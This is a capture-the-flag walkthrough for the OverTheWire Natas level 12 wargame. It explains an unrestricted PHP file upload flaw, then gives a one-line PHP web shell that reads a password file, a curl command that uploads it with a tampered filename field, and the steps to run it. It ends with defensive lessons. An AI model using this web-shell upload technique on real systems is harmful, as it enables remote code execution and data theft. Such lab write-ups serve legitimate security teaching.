> **Level Goal:** Find the password for the next level.

---

## Connection Details

| Field    | Value                                                        |
| -------- | ------------------------------------------------------------ |
| URL      | `http://natas12.natas.labs.overthewire.org`                  |
| Username | `natas12`                                                    |
| Password | *found in [Natas Level 10 → 11](natas-level-10-level-11.md)* |

---

## Tools Used

- A web browser
- **View sourcecode** — the page links to its own PHP source
- **Browser DevTools** — to edit a hidden form field before submission
- A text editor — to write a minimal PHP web shell

---

## Solution

### Step 1 — Open the URL

Navigate to `http://natas12.natas.labs.overthewire.org` and log in with the password from Level 11.

The page presents a single form: **"Choose a JPEG to upload (max 1KB)"** and an upload button. Click **View sourcecode**.

---

### Step 2 — Read the Source Code

```php
<?
function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";
    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }
    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
        $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
    if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else {
            echo "There was an error uploading the file, please try again!";
        }
    }
}
?>
```

And the HTML form:

```html
<form enctype="multipart/form-data" action="index.php" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
    <input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
    Choose a JPEG to upload (max 1KB):<br/>
    <input name="uploadedfile" type="file" /><br />
    <input type="submit" value="Upload File" />
</form>
```

	Two things are immediately visible. First, there is no validation of the file's content, the server does not check whether the uploaded bytes are actually a JPEG image. Second, and more critically, the extension used to save the file does not come from the uploaded file itself. It comes from a hidden form field called `filename`, which the server trusts entirely.

---

### Understand the Vulnerability: Unrestricted File Upload

When you upload a file, the server's logic is:

1. Read the `filename` POST parameter (a hidden form field the browser submits alongside the file)
2. Extract its extension with `pathinfo($fn, PATHINFO_EXTENSION)`
3. Generate a random 10-character string and append that extension to build the storage path
4. Save the uploaded file to `upload/<random>.<ext>`
5. Return a clickable link to the stored file

The stored file lives inside the web root under `upload/`. That means any file stored there is directly accessible via HTTP — and if its extension is `.php`, the web server will execute it as PHP when you request it.

The page hints with the label "Choose a JPEG to upload" and the hidden field defaults to something like `a3f9z2q1lk.jpg`. But the server never verifies the extension, never inspects the file's content, and never enforces that `.jpg` is what ends up on disk. The extension is whatever the `filename` POST parameter says it is.

The attack is therefore straightforward: upload a PHP file, but manipulate the `filename` field so the server saves it with a `.php` extension instead of `.jpg`. Once it is stored as `.php` and accessible via a URL, browsing to it causes the web server to execute it, giving you arbitrary code execution on the server.

---

### Step 3 — Write the Web Shell

Create a file called `shell.php` locally with this content:

```php
<?php echo shell_exec('cat /etc/natas_webpass/natas13'); ?>
```

This is a minimal web shell. `shell_exec()` runs a shell command and returns its output as a string. `echo` prints that output into the HTTP response. When the server executes this file, you receive the contents of the password file directly in the browser.

Keep it under 1000 bytes — the server checks file size. This snippet is well within the limit.

---

### Step 4 — Intercept and Edit the Hidden Field

The hidden `filename` field is rendered server-side with a `.jpg` extension. You need to change it to `.php` before the form is submitted.

**Use curl to send the POST directly:**

```bash
curl -u natas12:<password> \
     -F "MAX_FILE_SIZE=1000" \
     -F "filename=shell.php" \
     -F "uploadedfile=@shell.php" \
     http://natas12.natas.labs.overthewire.org/index.php
```

The `-F "filename=shell.php"` field overrides the hidden parameter entirely. The server receives `shell.php` as the filename and derives `.php` as the extension.

---

### Step 5 — Execute the Shell

After uploading, the server responds with something like:

```
The file upload/x7k2mq9pfa.php has been uploaded
```

The path is a clickable link. Navigate to it:

```
http://natas12.natas.labs.overthewire.org/upload/x7k2mq9pfa.php
```

The web server finds a `.php` file and passes it to the PHP interpreter. Your `shell_exec('cat /etc/natas_webpass/natas13')` runs, and the page outputs the password for natas13.

That is the password for [Natas Level 12 → 13](natas-level-12-level-13.md).

---

## Key Takeaways

- **Never derive the saved filename's extension from user input.** The root failure here is that `makeRandomPathFromFilename()` calls `pathinfo()` on `$_POST["filename"]` — a value the client controls entirely. The server should assign the extension itself (hardcoded to `.jpg`, or determined from the actual file content), not accept it from the POST body.
- **Files uploaded to a web-accessible directory and executed by the server are remote code execution.** Uploading a `.php` file into the web root is equivalent to planting a backdoor. The upload directory should either be outside the web root, or served by a configuration that disables PHP execution within it (e.g. `php_flag engine off` in an `.htaccess` file).
- **Hidden form fields are not hidden from attackers.** Any value in the HTML is readable and modifiable by the client before submission. Treating hidden fields as trustworthy server-side data is a fundamental misunderstanding of how HTTP works.
- **File size checks do not provide security.** The 1000-byte limit prevents large uploads but does nothing to prevent a malicious payload — a working PHP shell fits in under 60 bytes.

---